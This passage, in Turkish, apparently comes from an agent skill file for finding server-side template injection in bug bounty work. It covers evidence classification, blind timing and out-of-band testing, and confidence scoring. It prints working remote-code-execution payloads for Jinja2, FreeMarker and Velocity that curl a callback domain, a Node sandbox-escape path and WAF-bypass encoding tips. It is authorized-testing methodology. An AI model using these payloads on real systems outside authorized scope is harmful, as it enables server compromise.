öncelikli iki ayrı deneme yoludur (bkz. §5).

**Adım 4 — `*`/`-` karakteri kararı (Adım 2'deki gözleme göre):**
Eğer Adım 1'de `*` düz yansıyorsa yukarıdaki dört varyantın hepsinde
`*` karakterini **olduğu gibi bırak** (yalnızca `{`/`}` encode edilir).
Eğer `*` de encode edilmiş yansıyorsa, `*` karakterini de aynı
encoding şemasıyla (örn. hex entity kullanıyorsan `*` için `&#x2A;`)
encode ederek payload'a ekle.

**Neden işe yarıyor:** Bazı uygulamalar/WAF'lar yalnızca **ham**
`{`, `}`, `%7B`, `%7D` gibi en yaygın temsilleri arar/engeller, ama
her aşamada tek bir decode katmanı (örn. HTML entity decode'u template
motoruna ulaşmadan **önce** bir noktada gerçekleşiyorsa) bu daha az
yaygın temsilleri (zero-padded decimal, unicode escape) gözden
kaçırabilir. Template motoru veya ara katman bu temsili decode edip
gerçek `{`/`}` karakterine çevirdiğinde, payload nihayetinde motora
düz metin olarak ulaşır ve normal şekilde evaluate edilir.

**Bu teknik ne zaman denenir:** Yalnızca §5'teki standart çarpma/
çıkarma probe'ları **negatif** döndüğünde VE Adım 1'deki gözlem en az
bir karakterin encode edilmiş yansıdığını gösterdiğinde. Aksi halde
(karakterler zaten düz yansıyorsa) bu teknik gereksizdir — standart
probe'lar zaten yeterlidir, gereksiz request harcanmaz.

### 8.3 Evidence Kategorileri — İki Ayrı Eksen: Causality vs Attribution

**Kritik düzeltme:** SSTI'nin var olduğunu kanıtlamak ile hangi engine
olduğunu kanıtlamak **iki ayrı sorudur** ve birbirine bağımlı
olmamalıdır. Engine'i (fingerprint ile) bilmiyor olman, SSTI'nin var
olduğuna dair kanıtını zayıflatmaz — custom/bilinmeyen bir engine'de,
ya da hata mesajları kapalı bir hedefte, agent hiçbir zaman Strong
fingerprint indicator'ı elde edemeyebilir; bu durumda "engine
bilinmiyor, o yüzden SSTI de probable kalsın" demek gereksiz bir
false-negative üretir.

```
Eksen 1 — Causality (SSTI'nin kendisi)
├── Reflection-correlation evidence  (marker + sonuç aynı yerde, tesadüf değil)
├── Evaluation evidence              (deterministic hesaplama + geçerli negatif kontrol)
├── Stored/indirect execution evidence (zincir haritalama ile doğrulandı mı)
└── OOB evidence                      (network callback alındı mı)

Eksen 2 — Attribution (hangi engine)
├── Engine fingerprint evidence       (error/syntax sinyalleri)
├── Error signature evidence          (paket/sınıf adı içeren stack trace)
└── CMS/framework fingerprint evidence (§13 tablosundan)

Destekleyici (tek başına ne causality ne attribution kanıtlar)
└── Context evidence                  (payload doğru context'e oturdu mu —
                                        bu bir "delivery/parsing" bilgisidir,
                                        vulnerability confirmation'ı değil)
```

**Kanıt bağımsızlığı (Eksen 1 içinde):** Bir sonucu üst seviyeye
taşımak için kullanılan "ikinci kanıt", **aynı altta yatan davranışa**
dayanıyorsa bağımsız sayılmaz. Örneğin `{{6666*6666}}` ve
`{{6666*6667-6666}}` ikisi de yalnızca "aritmetik motoru çalışıyor"
bilgisini kanıtlar — tek bir kanıt (evaluation evidence) sayılır.

**Netleştirme — "iki farklı payload" ile "iki farklı evidence
category" karıştırılmamalı:**

| Kombinasyon | Sonuç |
|---|---|
| çarpma + çarpma (farklı sayılarla) | **Aynı** evidence category (evaluation) — bağımsız değil, yalnızca aynı kanıtın tekrarı |
| çarpma + çıkarma | **Aynı** evidence category (evaluation) — ama farklı bir kod yolu test edildiği için evaluation kanıtı **daha güçlüdür** (bkz. aşağıdaki paragraf); yine de **yeni bir category oluşturmaz** |
| evaluation + OOB | **İki farklı** evidence category — gerçek bağımsız kanıt |
| evaluation + stored/indirect execution | **İki farklı** evidence category — gerçek bağımsız kanıt |
| evaluation + engine fingerprint (Eksen 2) | Eksen 1 içinde tek kategori kalır (fingerprint Eksen 2'ye ait, attribution'ı güçlendirir ama causality kanıtına yeni bir Eksen-1 category eklemez) |

Bu tablonun amacı, agent'ın "iki farklı payload denedim, o zaman iki
bağımsız kanıtım var" şeklindeki yaygın hatasına düşmesini önlemektir
— aynı Eksen-1 kategorisinden (evaluation) kaç varyant denenirse
denensin, bu tek bir kanıt türü olarak kalır; §8.4'teki "confirmed"
eşiği zaten tek bir Eksen-1 kanıt türünü yeterli saydığı için bu ayrımı
netleştirmek pratik bir fark yaratmaz, ama confidence_score (§10.5)
hesaplarken puanların yanlışlıkla ikiye katlanmasını önler.

Buna karşılık, **farklı bir aritmetik operatör** (örn. çarpma yerine
çıkarma — bkz. §5 Aritmetik Probe Ailesi) ile elde edilen ikinci bir
evaluation sonucu, aynı kategoriden olsa da **farklı bir kod yolunu**
(motorun farklı bir operatör implementasyonunu) test ettiği için daha
güçlü bir teyittir; yine de tek başına yeni bir kategori oluşturmaz.

### 8.4 False Positive / False Negative Eliminasyonu

Aşağıdaki sınıflandırma **öneri/örnek bir model** olarak sunulmaktadır,
evrensel bir standart değildir.

**Sınıflandırma — iki ayrı sonuç üretir (SSTI classification VE engine
classification ayrı ayrı raporlanır, birbirine kilitlenmez):**

*SSTI (causality) classification:*
- **Confirmed:** Eksen 1'den **tek bir kanıt türü bile** (evaluation
  evidence, stored/indirect evidence veya OOB evidence), §5'teki
  "Pozitif Sayılma Kuralı"nın üç şartını (marker + doğru konumda
  deterministic sonuç + **geçerli** bir negatif kontrol — bkz. §5.1
  Negatif Kontrol Nasıl Kurulur) tam olarak sağlıyorsa **yeterlidir**.
  Engine attribution'ın confirmed/probable/unknown olması bu sonucu
  **değiştirmez**.
- **Probable:** Evaluation sinyali var ama negatif kontrol tam
  doğrulanamadı (rate limit, erişim kısıtı vb.) veya yalnızca
  reflection-correlation seviyesinde kanıt var.
- **Inconclusive:** Belirsiz/kısmi sinyal (örn. status code değişti
  ama body aynı) — ek probe gerektirir.
- **Negative:** Eksen 1'den hiçbir kanıt alınamadı.

*Engine (attribution) classification — SSTI classification'dan
bağımsız, ayrı bir alan olarak raporlanır:*
- **Confirmed:** En az bir Strong indicator (genelde error signature)
  + tutarlı davranış.
- **Probable:** Yalnızca weak/medium indicator'lar var, hipotez
  "leading" ama Strong indicator yok.
- **Unknown:** Hiçbir attribution sinyali toplanamadı — bu durumda
  rapor "Confirmed SSTI, engine: unknown/custom" şeklinde yazılır; bu
  **geçerli ve eksiksiz bir sonuçtur**, "önce engine'i bul, sonra
  SSTI'yi confirm et" sırası zorunlu değildir.

**Yaygın false-positive kaynakları:**
- **CDN/cache** eski bir response'u tekrar sunuyor → cache-busting
  parametresi ekleyerek ele.
- **WAF'ın kendi hata sayfası** SSTI hatasıyla karıştırılıyor → WAF
  imzası genelde farklı HTML yapısı/başlığa sahiptir, karşılaştırmalı
  kontrolle ayır.
- **CSTI (client-side):** `{{6666*6666}}` tarayıcıda (AngularJS/Vue)
  render olup `44435556`'ya dönüşüyor — bu SSTI DEĞİLDİR. Her zaman
  **ham HTTP response'a** (view-source/curl çıktısı) bak: sonuç
  sunucudan gelen ham HTML/JSON içinde mi (SSTI), yoksa ham response'ta
  hâlâ `{{6666*6666}}` yazıp yalnızca tarayıcıda JS çalıştıktan sonra
  mı görünüyor (CSTI, kapsam dışı)?
- **Uygulamanın kendi meşru "hesap makinesi/formül" özelliği** —
  aritmetik sonucu doğal olarak gösteriyor olabilir; bağlamı kontrol
  et.
- **Object/property access injection ile karıştırılması** — bkz. §6
  Type Confusion; motorun kendi delimiter'ı gerçekten derlenmiyorsa bu
  SSTI değildir.

**Evidence Tablosu Şablonu** — her aday için tut:

| Alan | Açıklama |
|---|---|
| payload | Kullanılan tam payload |
| context | plain/HTML/attribute/string/expression |
| status_code | Baseline ile karşılaştırmalı |
| response_diff | Length/timing/header farkı |
| evidence_kategorisi | reflection-correlation / evaluation / stored-indirect / OOB (Eksen 1) veya fingerprint/error-signature/cms-fingerprint (Eksen 2) |
| ssti_classification | confirmed / probable / inconclusive / negative |
| engine_classification | confirmed / probable / unknown |
| confidence | §10.5 Confidence Scoring'e göre puan (yalnızca destekleyici) |

---

## 9. Stored / Indirect / Blind SSTI

### 9.1 Stored/Indirect Zincir Haritalama

1. Payload'ı biricik bir marker ile olası "kaynak" alana gönder
   (profil, ayar, form, destek talebi vb.).
2. Uygulamanın bu veriyi nerede **kullanabileceğini** haritalandır:
   e-posta bildirimleri, admin panel listeleri, PDF/rapor export'ları,
   haftalık özet e-postaları, public profil sayfaları, webhook/mesaj
   entegrasyonları.
3. Her olası render noktasını (mümkünse) tetikle veya bekle.
4. Zincir 2+ adımdan oluşuyorsa her adımı ayrı doğrula (veri gerçekten
   kaydedildi mi, tetikleyici gerçekten çalıştı mı) — "payload
   çalışmadı" ile "render noktasına hiç ulaşmadı" ayrımını net tut.

**Gerçek dünya örneği (XWiki `SolrSearch`):** Bu,
indirect + reflected karışımı ilginç bir örnektir. XWiki ≤ 15.10.10,
kimlik doğrulaması gerektirmeyen bir RSS arama feed'inde `text` query
parametresini alıp wiki syntax'ının içine gömüp makroları evaluate
ediyordu. `}}}` ile mevcut bloğu kapatıp ardından `{{groovy}}` enjekte
etmek, JVM içinde keyfi Groovy kodu çalıştırılmasına yol açıyordu —
sonuç, RSS `<title>` alanında (yani normal response akışının dışında,
farklı bir formatta) görünüyordu. Bu, "sink her zaman ana HTML response
değildir, farklı bir response formatında (RSS, JSON, e-posta) da
olabilir" prensibinin somut bir örneğidir.

### 9.2 Blind SSTI — Timing-based

- Engine'e özgü "yapay olarak yavaş" bir expression enjekte et (örn.
  büyük range üzerinde iterasyon, ağır string tekrarı — bkz. ilgili
  engine profili §12).
- Ağ varyansını elemek için birden fazla ölçüm al, istatistiksel eşik
  kullan (örn. median + 3×IQR).
- Timing tek başına **probable** kanıt sayılır (bkz. §8.3 Eksen 1 —
  reflection-correlation seviyesinde), confirmed için OOB veya
  stored/indirect gibi daha güçlü bir Eksen 1 kanıtı tercih edilmelidir.
  **Neden — diğer Eksen-1 kategorilerinden yapısal farkı:** evaluation,
  OOB ve stored/indirect kanıtları execution'a **doğrudan** bağlıdır
  (response'ta hesaplanmış sonuç görünür, callback gerçekten gelir,
  veya başka bir yerde execution etkisi doğrulanır) — timing ise yalnızca
  **istatistiksel korelasyon** sağlar. En sıkı istatistiksel kural
  (aşağıdaki N=7/IQR/mutlak-eşik seti) bile şu confounder'ları elemez:
  garbage collection duraklaması, o anki sunucu yükü, WAF/proxy'nin
  belirli payload pattern'lerini işlerken gösterdiği gecikme — bunların
  hepsi, gerçek bir evaluation olmadan da "aday payload daha yavaş
  döndü" sinyaliyle aynı istatistiksel imzayı üretebilir. Bu yüzden
  timing, ne kadar titiz ölçülürse ölçülsün, tek başına **doğrudan
  causality kanıtı** değil, yalnızca onu destekleyen bir sinyaldir.

**Sınırlı kaynak kullanımı (bounded resource probe) — KRİTİK:**
Timing probe'u §0.2'deki "kasıtlı ağır DoS yok" kuralına tabidir. Bu
yüzden "büyük range" ifadesi **sınırsız/keşfedilerek büyütülen** bir
değer anlamına gelmez:
- **Sabit, küçük bir işlem yükü** ile başla (örn. birkaç bin
  elemanlık bir range/iterasyon).
- Baseline'ı N kez, aday payload'ı N kez ölç (aynı N) — **somut
  başlangıç değeri: N=7** (istatistiksel gürültüyü elemek için pratik
  bir minimum; ağ/sunucu varyansı yüksekse N=15'e çıkar).
- Sonucu median + IQR/MAD gibi bir istatistikle değerlendir — **somut
  karar kuralı:** aday payload'ın medyanı, baseline medyanının **+3×IQR
  (baseline)** değerini aşıyorsa VE bu fark **mutlak olarak en az
  300-500ms** ise (küçük, gürültü seviyesindeki farkları "pozitif"
  saymamak için bir alt sınır) → timing evidence pozitif. İkisinden
  yalnızca biri sağlanıyorsa (örn. istatistiksel eşik geçildi ama fark
  50ms) → inconclusive, N'i artırıp tekrar ölç.
- **Sabit bir üst sınır** koy (örn. tek bir isteğin toplam süresi
  belirlenen bir eşiği — örn. birkaç saniyeyi — geçerse isteği iptal
  et/bekleme).
- İşlem yükünü **kademeli** artırma ihtiyacı varsa (ilk deneme
  yeterince ayırt edici değilse) her adımda küçük bir katsayıyla
  artır, geometrik/sınırsız büyütme yapma; bir kaynak amplifikasyonu
  (response süresinin beklenenden çok daha fazla uzaması, hedefin
  yanıt vermemeye başlaması gibi) gözlenirse **derhal dur**.

### 9.3 Blind SSTI — Out-of-band (OOB)

**Düzeltme — OOB, sandbox yokluğuna değil, erişilebilir fonksiyon/
helper kümesine bağlıdır:** "OOB yalnızca sandbox'sız motorlarda
mümkündür" varsayımı **yanlıştır**. OOB'un mümkün olup olmaması,
template environment'ın erişebildiği fonksiyon/object/helper'ların
network etkileşimine izin verip vermediğine bağlıdır:
- Sandbox'lı bir motorda bile whitelist'e dahil edilmiş bir helper
  (örn. bir "include from URL" veya "fetch" filtresi) OOB'a izin
  verebilir.
- Sandbox'sız bir motorda da hiçbir network-capable fonksiyona erişim
  yoksa OOB mümkün olmayabilir.

Bu nedenle OOB denemeden önce ilgili engine profilinde (§12) hangi
fonksiyon/helper'ların mevcut olduğunu araştır. Kendi kontrolündeki bir
DNS/HTTP callback alan adına istek attıran bir payload kullan
(çoğu engine profilinde `curl`/`wget`/`Runtime.exec` örnekleri buna
uyarlanabilir); bu alan adına gelen istek güçlü bir OOB evidence
sayılır. Blind confirmation'da önce timing (daha zayıf kanıt, daha
düşük risk), mümkünse ardından OOB (daha güçlü kanıt) denenmelidir.

#### OOB Callback Aracı — interactsh-client

Bu skill, OOB testleri için **tek bir araç** önerir: **interactsh-client**
(ProjectDiscovery). Diğer eski/miadını doldurmuş tarama araçlarının
aksine, interactsh yalnızca bir DNS/HTTP callback alan adı üretip
gelen etkileşimleri loglayan basit ve güncel bir araçtır — SSTI'ye
özgü bir "tespit" mantığı içermez, yalnızca OOB kanıtı toplamak için
kullanılır.

**Kurulum:**
```
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

**Kullanım — test oturumunun başında bir kez başlat:**
```
interactsh-client -v | tee interactsh-oob.log
```
Bu komut sana biricik bir alan adı verir (örn.
`8f3a2b1c.oast.fun` gibi). Bu alan adını, o oturumdaki **tüm** SSTI
adaylarının OOB payload'larında kullan, örneğin:

```
# Jinja2 (sandbox'sız), engine profilinden uyarlanmış:
{{ cycler.__init__.__globals__.os.popen('curl http://8f3a2b1c.oast.fun/j2').read() }}

# FreeMarker, Execute üzerinden:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://8f3a2b1c.oast.fun/fm")}

# Velocity, Runtime.exec zinciriyle:
#set($rt=$s.getClass().forName("java.lang.Runtime").getRuntime())
$rt.exec("curl http://8f3a2b1c.oast.fun/vel")
```

Gelen her istek, hangi payload'ın (örn. URL path'teki `/j2`, `/fm`,
`/vel` gibi bir işaretleyici ile) hangi adaya ait olduğunu ayırt
etmeni sağlayacak şekilde işaretlenmelidir — aynı alan adını tüm
adaylar için kullanıyorsan path/subdomain segmentini benzersiz tut.

**Yaşam döngüsü kuralı — KRİTİK:** `interactsh-client`'ı **testin en
başında** başlat ve **log tutarak** (`tee` ile dosyaya yaz) çalışır
durumda bırak. Agent, o hedefteki **tüm SSTI adaylarını tamamen
test edip bitirene kadar** interactsh-client'ı **kapatma** — OOB
ping'leri (özellikle DNS tabanlı olanlar, ya da hedef tarafında bir
kuyruk/worker/zamanlanmış görev üzerinden tetiklenen indirect/blind
senaryolar — bkz. §9.1) **saatler sonra bile gelebilir**. Erken
kapatma, gerçek bir zafiyetin OOB kanıtının kaçırılmasına (false
negative) yol açar. Agent'ın genel test döngüsü şu şekilde olmalı:

```
1. interactsh-client başlat + logla   (test oturumunun en başında)
2. Tüm SSTI adaylarını sırayla test et (§4 ana akış, tüm adaylar için)
3. Her OOB payload'ı gönderdiğinde bunu bir "bekleyen OOB" listesine ekle
4. Tüm adaylar test edildikten sonra bile, interactsh log dosyasını
   bir süre daha (hedefin işleme gecikmesine göre makul bir süre)
   izlemeye devam et
5. Ancak TÜM bekleyen OOB'lar için makul bir bekleme süresi geçtikten
   ve rapor yazımına geçildikten sonra interactsh-client'ı kapat
```

### 9.4 Engine Bazlı Blind/OOB Kapasite Hızlı Referansı

Her hedefte doğrulanması gereken, **varsayım değil başlangıç
hipotezi** niteliğinde bir tablo — "bu engine'de blind/OOB aramaya
değer mi" sorusunu hızlı cevaplamak için:

| Engine | Timing primitive | Network primitive (OOB) | Not |
|---|---|---|---|
| Jinja2 (sandbox'sız) | Range/string tekrarı ile üretilebilir | `os.popen`/`urllib` zinciriyle var (§12.1) | Sandbox varsa her ikisi de erişilebilir helper'a bağlı |
| Twig | `range()`/tekrar filtreleriyle üretilebilir | `curl`/harici istek yapan filtre varsa var; yoksa `_self.env.setCache` gibi dolaylı yollar araştırılmalı (§12.1) | Sandbox aktifse network helper'ları genelde kısıtlıdır |
| FreeMarker | Büyük döngü/rekürsif makro ile üretilebilir | `Execute`/`exec` built-in'i varsa var (§12.2) | Modern sürümlerde bu built-in'ler kaldırılmış olabilir |
| Velocity | `#foreach` ile büyük iterasyon | `Runtime.exec` zincirine erişim varsa var (§12.2) | Version-dependent |
| Thymeleaf/SpEL | SpEL üzerinden döngü/rekürsiyon | `T(java.lang.Runtime).exec` erişilebilirse var (§12.2) | Genelde application-specific |
| Nunjucks | Range tekrarı | `child_process` erişimi varsa var (§12.1) | Sandbox/CSP farklarına bakılmalı |
| Handlebars/Mustache | Zayıf — logic-less, doğal iterasyon primitive'i kısıtlı | Yalnızca helper-chain RCE'ye ulaşılabiliyorsa var (§12.3) | Timing genelde güvenilir sinyal değildir |
| ERB (Ruby) | `sleep`/döngü ile üretilebilir | `Open3`/`system` ile var (§12.3) | Sandbox yok, genelde kolay |
| Go (text/template) | Rekürsif `template` çağrısı ile sınırlı | Yalnızca `FuncMap`'e network-capable fonksiyon kayıtlıysa var (§12.4) | Whitelist modeli nedeniyle sık sık yok |
| Liquid | Zayıf — sandbox'lı, döngü sınırlı | Genelde yok (güçlü sandbox) — bkz. §12.3 | Negatif sonuç burada **beklenen** davranıştır |

**Kullanım kuralı:** Bu tablo bir hedefte OOB/timing denemeden önce
"bu engine'de gerçekçi mi" sorusunu sormak içindir; tablo negatif dese
bile hedefe özel bir helper/custom fonksiyon varsa gerçek durum farklı
olabilir — bu yalnızca bir başlangıç hipotezidir, kesin kural değildir.

**Network capability inceliği:** Yukarıdaki tablodaki "Network
primitive (OOB) var" satırları tek bir kategori gibi görünse de,
gerçekte hangi **kanal**ın erişilebilir olduğu payload seçimini
belirler — bir helper yalnızca DNS lookup yapabilirken bir başkası tam
HTTP isteği kurabilir:

| Kanal | Genelde erişilebilir olduğu durum |
|---|---|
| DNS | En sık — bir hostname resolve edilebiliyorsa yeterli (çoğu dilde `gethostbyname`/`socket` düzeyinde native bir çağrı yeterli) |
| HTTP/HTTPS | `curl`/`requests`/`urllib`/`HttpClient` gibi bir helper expose ediliyorsa |
| Raw socket | Nadir — genelde yalnızca sandbox'sız/native execution (RCE'ye çok yakın) durumlarda |

Bir hedefte yalnızca DNS kanalı doğrulanabiliyorsa (örn. Interactsh/
Burp Collaborator DNS log'u düşüyor ama HTTP log'u düşmüyor), bu hâlâ
**geçerli bir OOB confirmation'dır** — HTTP'nin de çalışması
gerektiğini varsaymadan raporla.

---

## 10. Confirmation, Impact Assessment, Confidence Scoring

### 10.1 Dört Ayrı Katman (Birbirine Karıştırılmamalı)

1. **Detection** → evaluation oluyor mu? (§5)
2. **Fingerprinting** → hangi engine? (§7)
3. **Confirmation** → detection sonucunu **bağımsız bir evidence
   kategorisiyle** yeniden doğrulama (§8.3).
4. **Impact Assessment** → zafiyetin yetki dahilinde gerçek etkisi
   (bu bölüm).

### 10.2 Confirmation Önceliği

Önce sistemde **kalıcı değişiklik yapmayan** (side-effect-free)
yöntemler denenir. **Ama dikkat:** side-effect-free ≠ risksiz/zararsız.
`{{config}}`, `{{self}}`, ortam değişkeni okuma gibi çıktılar hedefe
göre gerçekten hassas bilgi (secret key, credential) sızdırabilir —
bunlar otomatik olarak "safe" kategorisine konmamalı, elde edilen
bilginin hassasiyeti Impact Assessment'ta ayrıca değerlendirilmelidir.

**Differential confirmation:** §5.1'deki differential comparison
tekniğini kullan — **aynı operatörün** farklı bir deterministic
sonuç üreten varyantını karşılaştır (`{{6666*6666}}` → `44435556` vs
`{{6666*6665}}` → `44428890`, FARKLI sonuç). **Dikkat — motora özgü
"alternatif syntax" varyantlarını (örn. Jinja2'de `{{6666*'6666'}}`
string-tekrar davranışı) negatif kontrol olarak kullanma:** bu tür
varyantlar bazı motorlarda **kendileri de geçerli bir evaluation**
üretir (§12.1 Jinja2 profili bunu zaten belgeler) — "farklı sözdizimi"
"evaluate edilmedi" anlamına gelmez, bu yüzden güvenilir bir negatif
kontrol değildir. Güvenilir negatif kontrol, §5.1'de tanımlandığı gibi
ya aynı operatörün farklı sayısal sonucu ya da bilinçli sözdizimi
bozmadır. Bu teknik, §8.4'e göre **Eksen 1 (causality) için tek başına
"confirmed" SSTI'ye yeterlidir** — engine attribution'ın (Eksen 2)
ayrıca confirmed olması **şart değildir**; "Confirmed SSTI, engine:
unknown" geçerli bir sonuçtur.

### 10.3 Gerçekten Gerekli Olan Sınırlar

- Dosya/veri **silme veya değiştirme** yapılmaz.
- **Kalıcı** sistem/konfigürasyon değişikliği yapılmaz.
- **Reverse shell** veya kalıcı C2 bağlantısı kurulmaz.
- Kasıtlı ağır **DoS** oluşturacak komutlar denenmez.
- Test **scope'un dışına** sıçramaz.

**Gereksiz kısıtlama eklenmez — impact demonstration serbesttir:**
Yukarıdaki sınırların dışında kalan adımlar (`id`, `whoami`, `curl`,
`wget`, `ping`, `sleep N` gibi non-destructive PoC komutları; scope
içindeki hassas/ayrıcalıklı — örn. admin — veriye erişimin
gösterilmesi) **kısıtlanmaz**. Bunlar bug bounty raporlarının "gerçek
etkiyi kanıtlama" gereğinin normal parçasıdır.

### 10.4 Impact Assessment Üç Ekseni

1. Sandbox var mı / aşıldı mı.
2. Yalnızca bilgi sızıntısı mı, yoksa RCE'ye kadar gidiliyor mu.
3. Etkilenen veri/sistemin hassasiyeti (tek kullanıcı verisi /
   ayrıcalıklı-admin verisi / sunucu genelinde).

### 10.5 Confidence Scoring — ÖRNEK/ÖNERİ MODEL, Evrensel Standart Değil

**Önce kural, sonra sayı.** Bu skill'de nihai **classification**
her zaman §8.4'teki kurala göre belirlenir — ve bu kural artık **iki
ayrı eksende** çalışır:

```
SSTI classification    = Eksen 1 kuralı (§8.4)   ← belirleyici, tek
                          (causality)               başına yeterli
                                                     kanıt türü var mı?

Engine classification  = Eksen 2 kuralı (§8.4)   ← AYRI ve BAĞIMSIZ
                          (attribution)             bir eksen; SSTI
                                                     classification'ı
                                                     etkilemez

confidence_score        = aşağıdaki puanlama       ← yalnızca öncelik/
                                                      raporlama detayı
```

Aşağıdaki numeric score bu iki kuralın **yerine geçmez** — yalnızca
adaylar arasında önceliklendirme ve raporda "ne kadar güçlü" ifade
etmek için kullanılan ikincil bir sinyaldir.

**Neden bu ayrım gerekli:** Salt sayısal bir eşik kullanılırsa (örn.
"toplam ≥8 ise confirmed"), agent teorik olarak yalnızca zayıf-orta
kategorilerden puan toplayıp hiç güçlü bir kanıt elde etmeden
"confirmed" diyebilir — bu, raporun dayanıklılığını zayıflatır. Aynı
şekilde, SSTI'nin kendisi (Eksen 1) zaten sağlam kanıtlanmışken
yalnızca engine bilinmiyor diye (Eksen 2 eksik) SSTI sonucunu
"probable"a düşürmek de **false-negative**e yol açar — bu yüzden iki
eksen ayrı puanlanır ve ayrı raporlanır.

**Not:** "Negatif kontrol farkı" ayrı bir satır/kategori **değildir** —
§5 Pozitif Sayılma Kuralı'na göre zaten **evaluation evidence**'ın
geçerli sayılması için gereken şartlardan biridir; ayrı puanlanırsa
aynı kanıt iki kez sayılmış (double-counting) olur.

**Eksen 1 — SSTI (causality) puanlama:**

| Kanıt | Örnek puan |
|---|---|
| Reflection-correlation evidence | +1 |
| Evaluation evidence (geçerli negatif kontrol dahil — bkz. §5.1) | +5 |
| Stored/indirect execution evidence | +5 |
| OOB evidence | +6 |

- **≥5** → SSTI **confirmed** (tek bir güçlü kanıt türü zaten yeterli).
- **1–4** → SSTI **probable** (yalnızca reflection var, evaluation/
  stored/OOB henüz doğrulanamadı).
- **0** → SSTI **negative**.

**Eksen 2 — Engine (attribution) puanlama, tamamen ayrı:**

| Kanıt | Örnek puan |
|---|---|
| Weak indicator (§7) | +1 |
| Medium indicator (§7) | +2 |
| Strong indicator — genelde error signature (§7) | +4 |

- **≥4** (en az bir Strong indicator) → Engine **confirmed**.
- **1–3** → Engine **probable** (hipotez "leading" ama Strong yok).
- **0** → Engine **unknown**.

Bu eşikler örnektir, sabit kural değildir; **ama SSTI classification'ı
hiçbir zaman Engine classification'ın sonucuna bağımlı kılınmaz** —
rapor iki alanı ayrı ayrı gösterir (bkz. §14.1 raporlama şablonu).

### 10.6 Ne Zaman Durulmalı

- Skor "confirmed" eşiğine ulaştığında gereksiz **ek detection/
  confirmation** payload'ı denenmez — ama bu, impact'i kanıtlayan
  adımları (yukarıdaki "serbesttir" listesi) engellemez.
- Aday başına belirlenen request bütçesi (örn. 15 request) tükendiğinde
  → "inconclusive" işaretle, sıradaki adaya geç.
- WAF/rate-limit block'u art arda 3+ kez tetiklenirse → backoff uygula
  veya bypass denemesine geç (§8.2), sonsuz tekrar etme.

### 10.7 Paralel/Sıralı Çalışma

- Farklı endpoint'lerdeki generic probe'lar paralel yürütülebilir.
- Aynı endpoint içindeki fingerprinting adımları **sıralı** olmalı —
  her adımın sonucu bir sonraki payload seçimini belirler.

---

## 11. Modern Mimari Notları

- **Headless/API-first CMS:** Render genelde backend'in kendi e-posta/
  webhook/export özelliğinde olur, frontend'de değil — indirect SSTI
  mantığıyla ele al.
- **Microservice:** SSTI'nin bulunduğu servis ile render'ın gerçekleştiği
  servis farklı olabilir; zincir haritalamayı servisler arası (API
  çağrıları, mesaj kuyrukları) takip ederek yap.
- **Queue/worker sistemleri (Celery, Sidekiq, Bull):** Render genelde
  asenkron olur → doğrudan Blind SSTI metodolojisiyle örtüşür.
- **No-code/low-code platformlar ve workflow builder'lar:** Önemli ve
  giderek yaygınlaşan bir attack surface. Bazı workflow builder'lar
  (örn. n8n benzeri otomasyon araçları), kullanıcı tarafından yazılan
  ifadeleri bir Node.js sandbox'ı (`vm2`, `isolated-vm`) içinde
  değerlendirir; ancak expression context'i genelde `this.process.
  mainModule.require` gibi bir yola hâlâ erişim sağlayabilir — bu,
  dedike bir "Execute Command" node'u devre dışı bırakılmış olsa bile
  `child_process` modülünün yüklenip komut çalıştırılmasına izin
  verebilir (bkz. §12.3 NodeJS Expression Sandbox notu). Asıl soru
  "sandbox aşılıp başka kullanıcı verisine/sunucu kaynağına
  ulaşılabiliyor mu" — bunu klasik SSTI + yetki sınırı aşımı
  kombinasyonu olarak değerlendir ve öyle raporla.
  **Sınıflandırma notu:** Bu tür bir bulgu, §14.1 raporlama şablonundaki
  `vulnerability_class` alanına `EXPRESSION_INJECTION` olarak
  yazılmalıdır, `SSTI` olarak değil — çünkü burada kullanıcı girdisi bir
  **template kaynağı** değil, sandbox içinde değerlendirilen bir
  **script ifadesi**dir (bkz. §6 Type Confusion'daki benzer ayrım
  mantığı). Bu skill, workflow builder'ların hangi sürümünün hangi
  sandbox-escape advisory'sinden etkilendiğine dair bir versiyon
  matrisi **kasıtlı olarak tutmaz** — bu tür bilgi hızla eskir ve
  agent'ın "önce sürüm bul, sonra doğru payload'ı seç" gibi ek bir
  karar aşamasına zorlanması, gerçek zafiyeti bulma olasılığını
  artırmaz, yalnızca request bütçesini tüketir. Bunun yerine: yukarıdaki
  genel tekniği doğrudan dene; çalışmazsa bu "sandbox'ın bu spesifik
  yolu kapattığı" anlamına gelir (bkz. §7 Negative Capability mantığı),
  hedefin güncel olup olmadığını araştırmak ayrı ve opsiyonel bir
  adımdır.
- **GraphQL API'ler:** SSTI'nin kendisi için ayrı bir engine/teknik
  gerektirmez — GraphQL burada yalnızca bir **taşıma katmanıdır**
  (delivery mechanism), template sink'i genelde bir resolver'ın
  arkasındadır (§4 Sink Discovery aynen uygulanır). Pratik fark iki
  noktadadır: (1) **introspection** (`__schema`/`__type` sorguları)
  açıksa, hangi mutation/query alanlarının e-posta/PDF/rapor gibi
  yüksek riskli işlevlere karşılık geldiğini (§2'deki yüksek öncelikli
  endpoint kategorileri) doğrudan keşfetmek için kullanılabilir — bu,
  black-box'ta normalde tahmin edilmesi gereken sink'leri şemadan
  okunabilir hale getirir. Somut sorgu:
  ```graphql
  {
    __schema {
      queryType { fields { name type { name } } }
      mutationType { fields { name args { name type { name } } } }
    }
  }
  ```
  Dönen `fields[].name` listesini, §2'deki **yüksek öncelikli
  parametre adları** listesiyle eşleştir — özellikle `email`, `render`,
  `pdf`, `invoice`/`report`, `export`, `template`, `notification`
  geçen field/mutation adları öncelikli hedeftir (bu, introspection
  çıktısını rastgele taramak yerine §2'nin risk skorlama mantığını
  GraphQL şemasına uygulamaktır — ayrı bir liste değil, aynı listenin
  yeniden kullanımıdır);
  (2) GraphQL hata modeli farklıdır — **çoğu**
  implementasyon HTTP 200 döner ve hatayı `errors` array'i içinde taşır,
  bu yüzden error-based fingerprinting (§7) öncelikle HTTP status
  koduna değil **response body'sindeki `errors[].message`** alanına
  bakmalıdır. Bu evrensel bir kural değildir: bazı gateway/WAF
  katmanları (özellikle unhandled exception resolver seviyesine kadar
  fırlarsa) yine de HTTP 500 döndürebilir — bu yüzden hem `errors[]`
  hem de status code'u birlikte izle, yalnızca birine bağlı kalma.
- **WebSocket / persistent connection'lar:** Bir mesaj üzerinden
  tetiklenen SSTI, genelde **tek bir request-response** modeliyle değil
  bağlantı boyunca yayılan bir mesaj akışıyla çalışır — bu, doğrudan
